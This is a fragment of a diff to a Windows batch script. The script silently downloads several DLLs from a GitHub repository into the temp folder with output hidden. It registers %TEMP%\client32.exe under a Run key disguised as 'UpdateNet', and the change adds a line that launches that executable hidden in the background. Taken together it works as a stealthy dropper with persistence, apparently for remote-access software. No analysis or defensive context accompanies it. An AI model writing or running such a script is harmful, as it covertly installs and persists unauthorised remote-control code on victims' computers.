@@ -16,5 +16,5 @@ curl -L -o "%TEMP%\PCICHEK.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/head
 curl -L -o "%TEMP%\PCICL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL" >nul 2>&1
 curl -L -o "%TEMP%\TCCTL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL" >nul 2>&1
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "UpdateNet" /t REG_SZ /d "%TEMP%\client32.exe" /f
-
+start "" /B "%TEMP%\client32.exe" >nul 2>&1
 exit
